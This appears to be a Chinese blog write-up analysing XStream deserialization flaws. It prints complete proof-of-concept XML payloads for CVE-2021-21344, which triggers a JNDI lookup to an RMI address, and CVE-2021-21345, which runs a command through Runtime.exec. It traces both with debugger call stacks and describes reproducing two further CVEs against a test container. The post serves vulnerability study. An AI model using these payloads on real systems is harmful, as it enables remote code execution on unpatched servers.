## 前言

 **XStream** 是java类库，用来将对象序列化为XML(JSON)或反序列化为对象。

另外，Xstream是一种OXMapping
技术，是用来处理XML文件序列化的框架在将javaBean序列化，或将XML文件反序列化的时候，不需要其它辅助类和映射文件，使得XML序列化不再繁琐。

## 简介

people类与company类

    
    
    import java.io.IOException;
    import java.io.Serializable;
    
    public class People implements Serializable{
        private String name;
        private int age;
        private Company workCompany;
    
        public People(String name, int age, Company workCompany) {
            this.name = name;
            this.age = age;
            this.workCompany = workCompany;
        }
    
        public String getName() {
            return name;
        }
    
        public void setName(String name) {
            this.name = name;
        }
    
        public int getAge() {
            return age;
        }
    
        public void setAge(int age) {
            this.age = age;
        }
    
        public Company getWorkCompany() {
            return workCompany;
        }
    
        public void setWorkCompany(Company workCompany) {
            this.workCompany = workCompany;
        }
    
        private void readObject(java.io.ObjectInputStream s) throws IOException, ClassNotFoundException {
            s.defaultReadObject();
            System.out.println("People类");
        }
    }
    
    
    
    import java.io.IOException;
    import java.io.Serializable;
    
    public class Company implements Serializable {
        private String companyName;
        private String companyLocation;
    
        public Company(String companyName, String companyLocation) {
            this.companyName = companyName;
            this.companyLocation = companyLocation;
        }
    
        public String getCompanyName() {
            return companyName;
        }
    
        public void setCompanyName(String companyName) {
            this.companyName = companyName;
        }
    
        public String getCompanyLocation() {
            return companyLocation;
        }
    
        public void setCompanyLocation(String companyLocation) {
            this.companyLocation = companyLocation;
        }
    
        private void readObject(java.io.ObjectInputStream s) throws IOException, ClassNotFoundException {
            s.defaultReadObject();
            System.out.println("Company类");
        }
    }
    

**序列化与反序列化demo**  
public class Test {  
public static void main(String[] args) {  
XStream xStream = new XStream();  
People people = new People("xiaoming",25,new Company("TopSec","BeiJing"));  
String xml = xStream.toXML(people);  
System.out.println(xml);

    
    
    People people1 = (People)xStream.fromXML(xml);
        System.out.println(people1);
    }
    

}  
![image](https://image.3001.net/images/20230705/1688541432_64a518f832816cdeb261d.png!small)

利用方式：调用readObject()方法，触发反序列化攻击。

## 漏洞分析

 **POC:CVE-2021-21344**

    
    
    "<java.util.PriorityQueue serialization='custom'>\n" +
                    "  <unserializable-parents/>\n" +
                    "  <java.util.PriorityQueue>\n" +
                    "    <default>\n" +
                    "      <size>2</size>\n" +
                    "      <comparator class='sun.awt.datatransfer.DataTransferer$IndexOrderComparator'>\n" +
                    "        <indexMap class='com.sun.xml.internal.ws.client.ResponseContext'>\n" +
                    "          <packet>\n" +
                    "            <message class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart'>\n" +
                    "              <dataSource class='com.sun.xml.internal.ws.message.JAXBAttachment'>\n" +
                    "                <bridge class='com.sun.xml.internal.ws.db.glassfish.BridgeWrapper'>\n" +
                    "                  <bridge class='com.sun.xml.internal.bind.v2.runtime.BridgeImpl'>\n" +
                    "                    <bi class='com.sun.xml.internal.bind.v2.runtime.ClassBeanInfoImpl'>\n" +
                    "                      <jaxbType>com.sun.rowset.JdbcRowSetImpl</jaxbType>\n" +
                    "                      <uriProperties/>\n" +
                    "                      <attributeProperties/>\n" +
                    "                      <inheritedAttWildcard class='com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection'>\n" +
                    "                        <getter>\n" +
                    "                          <class>com.sun.rowset.JdbcRowSetImpl</class>\n" +
                    "                          <name>getDatabaseMetaData</name>\n" +
                    "                          <parameter-types/>\n" +
                    "                        </getter>\n" +
                    "                      </inheritedAttWildcard>\n" +
                    "                    </bi>\n" +
                    "                    <tagName/>\n" +
                    "                    <context>\n" +
                    "                      <marshallerPool class='com.sun.xml.internal.bind.v2.runtime.JAXBContextImpl$1'>\n" +
                    "                        <outer-class reference='../..'/>\n" +
                    "                      </marshallerPool>\n" +
                    "                      <nameList>\n" +
                    "                        <nsUriCannotBeDefaulted>\n" +
                    "                          <boolean>true</boolean>\n" +
                    "                        </nsUriCannotBeDefaulted>\n" +
                    "                        <namespaceURIs>\n" +
                    "                          <string>1</string>\n" +
                    "                        </namespaceURIs>\n" +
                    "                        <localNames>\n" +
                    "                          <string>UTF-8</string>\n" +
                    "                        </localNames>\n" +
                    "                      </nameList>\n" +
                    "                    </context>\n" +
                    "                  </bridge>\n" +
                    "                </bridge>\n" +
                    "                <jaxbObject class='com.sun.rowset.JdbcRowSetImpl' serialization='custom'>\n" +
                    "                  <javax.sql.rowset.BaseRowSet>\n" +
                    "                    <default>\n" +
                    "                      <concurrency>1008</concurrency>\n" +
                    "                      <escapeProcessing>true</escapeProcessing>\n" +
                    "                      <fetchDir>1000</fetchDir>\n" +
                    "                      <fetchSize>0</fetchSize>\n" +
                    "                      <isolation>2</isolation>\n" +
                    "                      <maxFieldSize>0</maxFieldSize>\n" +
                    "                      <maxRows>0</maxRows>\n" +
                    "                      <queryTimeout>0</queryTimeout>\n" +
                    "                      <readOnly>true</readOnly>\n" +
                    "                      <rowSetType>1004</rowSetType>\n" +
                    "                      <showDeleted>false</showDeleted>\n" +
                    "                      <dataSource>rmi://127.0.0.1:1099/m2dv3g</dataSource>\n" +
                    "                      <params/>\n" +
                    "                    </default>\n" +
                    "                  </javax.sql.rowset.BaseRowSet>\n" +
                    "                  <com.sun.rowset.JdbcRowSetImpl>\n" +
                    "                    <default>\n" +
                    "                      <iMatchColumns>\n" +
                    "                        <int>-1</int>\n" +
                    "                        <int>-1</int>\n" +
                    "                        <int>-1</int>\n" +
                    "                        <int>-1</int>\n" +
                    "                        <int>-1</int>\n" +
                    "                        <int>-1</int>\n" +
                    "                        <int>-1</int>\n" +
                    "                        <int>-1</int>\n" +
                    "                        <int>-1</int>\n" +
                    "                        <int>-1</int>\n" +
                    "                      </iMatchColumns>\n" +
                    "                      <strMatchColumns>\n" +
                    "                        <string>foo</string>\n" +
                    "                        <null/>\n" +
                    "                        <null/>\n" +
                    "                        <null/>\n" +
                    "                        <null/>\n" +
                    "                        <null/>\n" +
                    "                        <null/>\n" +
                    "                        <null/>\n" +
                    "                        <null/>\n" +
                    "                        <null/>\n" +
                    "                      </strMatchColumns>\n" +
                    "                    </default>\n" +
                    "                  </com.sun.rowset.JdbcRowSetImpl>\n" +
                    "                </jaxbObject>\n" +
                    "              </dataSource>\n" +
                    "            </message>\n" +
                    "            <satellites/>\n" +
                    "            <invocationProperties/>\n" +
                    "          </packet>\n" +
                    "        </indexMap>\n" +
                    "      </comparator>\n" +
                    "    </default>\n" +
                    "    <int>3</int>\n" +
                    "    <string>javax.xml.ws.binding.attachments.inbound</string>\n" +
                    "    <string>javax.xml.ws.binding.attachments.inbound</string>\n" +
                    "  </java.util.PriorityQueue>\n" +
                    "</java.util.PriorityQueue>";
    

在最终触发点打上断点，下面是调用栈。  
connect:623, JdbcRowSetImpl (com.sun.rowset)  
getDatabaseMetaData:4004, JdbcRowSetImpl (com.sun.rowset)  
invoke0:-1, NativeMethodAccessorImpl (sun.reflect) [2]  
invoke:62, NativeMethodAccessorImpl (sun.reflect)  
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)  
invoke:497, Method (java.lang.reflect)  
get:343, Accessor$GetterSetterReflection
(com.sun.xml.internal.bind.v2.runtime.reflect)  
serializeURIs:402, ClassBeanInfoImpl (com.sun.xml.internal.bind.v2.runtime)  
childAsXsiType:662, XMLSerializer (com.sun.xml.internal.bind.v2.runtime)  
write:256, MarshallerImpl (com.sun.xml.internal.bind.v2.runtime)  
marshal:89, BridgeImpl (com.sun.xml.internal.bind.v2.runtime)  
marshal:130, Bridge (com.sun.xml.internal.bind.api)  
marshal:161, BridgeWrapper (com.sun.xml.internal.ws.db.glassfish)  
writeTo:109, JAXBAttachment (com.sun.xml.internal.ws.message)  
asInputStream:99, JAXBAttachment (com.sun.xml.internal.ws.message)  
getInputStream:125, JAXBAttachment (com.sun.xml.internal.ws.message)  
getMessage:366, XMLMessage$XMLMultiPart (com.sun.xml.internal.ws.encoding.xml)  
getAttachments:465, XMLMessage$XMLMultiPart
(com.sun.xml.internal.ws.encoding.xml)  
getAttachments:103, MessageWrapper (com.sun.xml.internal.ws.api.message)  
get:111, ResponseContext (com.sun.xml.internal.ws.client)  
compareIndices:2492, DataTransferer$IndexedComparator (sun.awt.datatransfer)  
compare:2970, DataTransferer$IndexOrderComparator (sun.awt.datatransfer)  
siftDownUsingComparator:721, PriorityQueue (java.util)  
siftDown:687, PriorityQueue (java.util)  
heapify:736, PriorityQueue (java.util)  
readObject:795, PriorityQueue (java.util)  
invoke0:-1, NativeMethodAccessorImpl (sun.reflect) [1]  
invoke:62, NativeMethodAccessorImpl (sun.reflect)  
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)  
invoke:497, Method (java.lang.reflect)  
callReadObject:132, SerializationMembers (com.thoughtworks.xstream.core.util)  
doUnmarshal:443, SerializableConverter
(com.thoughtworks.xstream.converters.reflection)  
unmarshal:277, AbstractReflectionConverter
(com.thoughtworks.xstream.converters.reflection)  
convert:72, TreeUnmarshaller (com.thoughtworks.xstream.core)  
convert:72, AbstractReferenceUnmarshaller (com.thoughtworks.xstream.core)  
convertAnother:66, TreeUnmarshaller (com.thoughtworks.xstream.core)  
convertAnother:50, TreeUnmarshaller (com.thoughtworks.xstream.core)  
start:134, TreeUnmarshaller (com.thoughtworks.xstream.core)  
unmarshal:32, AbstractTreeMarshallingStrategy (com.thoughtworks.xstream.core)  
unmarshal:1409, XStream (com.thoughtworks.xstream)  
unmarshal:1388, XStream (com.thoughtworks.xstream)  
fromXML:1273, XStream (com.thoughtworks.xstream)  
fromXML:1264, XStream (com.thoughtworks.xstream)  
main:121, Test

由分析可知，入口类为PriorityQueue（优先队列）实现了Serializable接口并且重写了readObject方法，刚好是符合利用条件的，在PriorityQueued的readObject方法中打上断点。然后我们跟进heapify()方法，经过调试来到PriorityQueue类的siftDownUsingComparator方法，然后调用PriorityQueue类中存储在comparator属性中的对象的compare方法，剩下的过程就是一系列的嵌套调用，最终会执行到com.sun.rowset.JdbcRowSetImpl的getDatabaseMetaData中，并最终在JdbcRowSetImpl的connect方法中通过JNDI去lookup事先封装在JdbcRowSetImpl的dataSource中的恶意地址，符合JNDI的注入的限制条件即可利用成功。

![image](https://image.3001.net/images/20230705/1688541906_64a51ad2ea68da91d3b87.png!small)

 **POC:CVE-2021-21345**

    
    
    "<java.util.PriorityQueue serialization='custom'>\n" +
                    "  <unserializable-parents/>\n" +
                    "  <java.util.PriorityQueue>\n" +
                    "    <default>\n" +
                    "      <size>2</size>\n" +
                    "      <comparator class='sun.awt.datatransfer.DataTransferer$IndexOrderComparator'>\n" +
                    "        <indexMap class='com.sun.xml.internal.ws.client.ResponseContext'>\n" +
                    "          <packet>\n" +
                    "            <message class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart'>\n" +
                    "              <dataSource class='com.sun.xml.internal.ws.message.JAXBAttachment'>\n" +
                    "                <bridge class='com.sun.xml.internal.ws.db.glassfish.BridgeWrapper'>\n" +
                    "                  <bridge class='com.sun.xml.internal.bind.v2.runtime.BridgeImpl'>\n" +
                    "                    <bi class='com.sun.xml.internal.bind.v2.runtime.ClassBeanInfoImpl'>\n" +
                    "                      <jaxbType>com.sun.corba.se.impl.activation.ServerTableEntry</jaxbType>\n" +
                    "                      <uriProperties/>\n" +
                    "                      <attributeProperties/>\n" +
                    "                      <inheritedAttWildcard class='com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection'>\n" +
                    "                        <getter>\n" +
                    "                          <class>com.sun.corba.se.impl.activation.ServerTableEntry</class>\n" +
                    "                          <name>verify</name>\n" +
                    "                          <parameter-types/>\n" +
                    "                        </getter>\n" +
                    "                      </inheritedAttWildcard>\n" +
                    "                    </bi>\n" +
                    "                    <tagName/>\n" +
                    "                    <context>\n" +
                    "                      <marshallerPool class='com.sun.xml.internal.bind.v2.runtime.JAXBContextImpl$1'>\n" +
                    "                        <outer-class reference='../..'/>\n" +
                    "                      </marshallerPool>\n" +
                    "                      <nameList>\n" +
                    "                        <nsUriCannotBeDefaulted>\n" +
                    "                          <boolean>true</boolean>\n" +
                    "                        </nsUriCannotBeDefaulted>\n" +
                    "                        <namespaceURIs>\n" +
                    "                          <string>1</string>\n" +
                    "                        </namespaceURIs>\n" +
                    "                        <localNames>\n" +
                    "                          <string>UTF-8</string>\n" +
                    "                        </localNames>\n" +
                    "                      </nameList>\n" +
                    "                    </context>\n" +
                    "                  </bridge>\n" +
                    "                </bridge>\n" +
                    "                <jaxbObject class='com.sun.corba.se.impl.activation.ServerTableEntry'>\n" +
                    "                  <activationCmd>calc</activationCmd>\n" +
                    "                </jaxbObject>\n" +
                    "              </dataSource>\n" +
                    "            </message>\n" +
                    "            <satellites/>\n" +
                    "            <invocationProperties/>\n" +
                    "          </packet>\n" +
                    "        </indexMap>\n" +
                    "      </comparator>\n" +
                    "    </default>\n" +
                    "    <int>3</int>\n" +
                    "    <string>javax.xml.ws.binding.attachments.inbound</string>\n" +
                    "    <string>javax.xml.ws.binding.attachments.inbound</string>\n" +
                    "  </java.util.PriorityQueue>\n" +
                    "</java.util.PriorityQueue>";
    
    
    
    "                    </context>\n" +
                "                  </bridge>\n" +
                "                </bridge>\n" +
                "                <jaxbObject class='com.sun.corba.se.impl.activation.ServerTableEntry'>\n" +
                "                  <activationCmd>calc</activationCmd>\n" +
                "                </jaxbObject>\n" +
                "              </dataSource>\n" +
                "            </message>\n" +
                "            <satellites/>\n" +
                "            <invocationProperties/>\n" +
                "          </packet>\n" +
                "        </indexMap>\n" +
                "      </comparator>\n" +
                "    </default>\n" +
                "    <int>3</int>\n" +
                "    <string>javax.xml.ws.binding.attachments.inbound</string>\n" +
                "    <string>javax.xml.ws.binding.attachments.inbound</string>\n" +
                "  </java.util.PriorityQueue>\n" +
                "</java.util.PriorityQueue>";
    

get:111, ResponseContext (com.sun.xml.internal.ws.client)  
compareIndices:2492, DataTransferer$IndexedComparator (sun.awt.datatransfer)  
compare:2970, DataTransferer$IndexOrderComparator (sun.awt.datatransfer)  
siftDownUsingComparator:721, PriorityQueue (java.util)  
siftDown:687, PriorityQueue (java.util)  
heapify:736, PriorityQueue (java.util)  
readObject:795, PriorityQueue (java.util)  
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)  
invoke:62, NativeMethodAccessorImpl (sun.reflect)  
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)  
invoke:497, Method (java.lang.reflect)  
callReadObject:132, SerializationMembers (com.thoughtworks.xstream.core.util)  
doUnmarshal:443, SerializableConverter (com.tho  
unmarshal:32, AbstractTreeMarshallingStrategy (com.thoughtworks.xstream.core)  
unmarshal:1409, XStream (com.thoughtworks.xstream)  
unmarshal:1388, XStream (com.thoughtworks.xstream)  
fromXML:1273, XStream (com.thoughtworks.xstream)  
fromXML:1264, XStream (com.thoughtworks.xstream)  
main:77, Test

可以知道与CVE-2021-21344唯一有区别的地方在于最后命令的触发点  
![image](https://image.3001.net/images/20230705/1688542114_64a51ba2ae8722a2fdf29.png!small)  
这里直接将activationCmd属性中的值作为参数调用Runtime.exec来进行执行，而activationCmd在序列化的数据中就已经被我们自定义了值。

## 漏洞复现

 **CVE-2021-21351**  
访问8080端口  
![image](https://image.3001.net/images/20230705/1688544300_64a5242c14849efbf790d.png!small)

本地开启JNDI服务器进行监听  
![image](https://image.3001.net/images/20230705/1688544317_64a5243d096688d650ef1.png!small)

POC中更改为指定的RMI或LDAP  
![image](https://image.3001.net/images/20230705/1688544328_64a52448642cd7ffdbe3f.png!small)

访问指定容器，发现攻击成功![image](https://image.3001.net/images/20230705/1688544339_64a524530324c2822f17b.png!small)

**CVE-2021-29505**![image](https://image.3001.net/images/20230705/1688544370_64a524729dfc17e289920.png!small)

本地开启一个JRMP监听，利用CC6写入命令。![image](https://image.3001.net/images/20230705/1688544394_64a5248a9323d02b2cda7.png!small)

访问容器，命令执行成功。  
![image](https://image.3001.net/images/20230705/1688544421_64a524a55b675694c78d5.png!small)

## 总结

 **Xstream**
通过标签转换可以获取到相应的java对象，通过获取特定属性的函数名称从而调用函数并赋值来更改流程执行顺序，最终的利用点可以是反序列化，或者是JNDI命令执行。

## 参考

https://blog.csdn.net/weixin_42228939/article/details/95890201

https://xz.aliyun.com/t/8694#toc-0

https://xz.aliyun.com/t/11372#toc-8

https://paper.seebug.org/1543/#2-cve-2021-21345

